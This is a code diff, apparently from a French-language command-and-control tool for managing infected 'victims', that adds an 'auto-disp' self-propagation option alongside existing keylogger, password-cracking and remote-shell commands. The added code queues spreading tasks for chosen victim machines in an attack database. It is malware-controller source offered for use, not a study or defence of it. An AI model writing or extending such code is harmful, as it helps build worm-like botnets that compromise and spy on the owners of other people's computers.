@@ -50,6 +50,9 @@ action_group.add_argument("--crack", action="store_true", help="lance une attaqu
 # Arguments spécifiques à l'attaque de keylogger
 action_group.add_argument("--keylogger", action="store_true", help="lance un keylogger sur un ordinateur")
 
+# Arguments spécifiques à l'attaque de auto dispertion
+action_group.add_argument("--auto-disp", action="store_true", help="lance un une auto dispertion sur le réseau")
+
 # Lance un shell sur une machine précise
 action_group.add_argument("--shell", action="store_true", help="Lance un shell sur une machine précise")
 
@@ -176,6 +179,31 @@ elif args.keylogger:
         for id in result:
             query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
             values = (id[0], "keylogger", "pending", "{\"arg1\": \"" + str(args.time) + "\", \"arg2\": \"\", \"arg3\": \"\"}")
+
+            mycursor.execute(query, values)
+
+
+############################################################
+
+
+
+elif args.auto_disp:
+
+    if not args.host:
+        parser.error("--auto-disp nécessite l'argument --host")
+
+    print(f"keylogger lancement de l'auto replication sur {args.host}")
+
+    for victim in args.host.split(","):
+        query = "SELECT id FROM victims WHERE id = %s OR uid = %s OR ip = %s"
+        values = (victim, victim, victim, )
+        mycursor.execute(query, values)
+
+        result = mycursor.fetchall()
+
+        for id in result:
+            query = "INSERT INTO victim_attacks (victim_id, type, state, text, created_at, updated_at) VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP)"
+            values = (id[0], "auto-disp", "pending", "{\"arg1\": \",\", \"arg2\": \"\", \"arg3\": \"\"}")
 
             mycursor.execute(query, values)
 
@@ -894,4 +922,5 @@ elif args.start:
         #             pass
 else :
     parser.error("no action specified. Use -h/--help for help")
+print("commit !!!! ")
 db.commit()
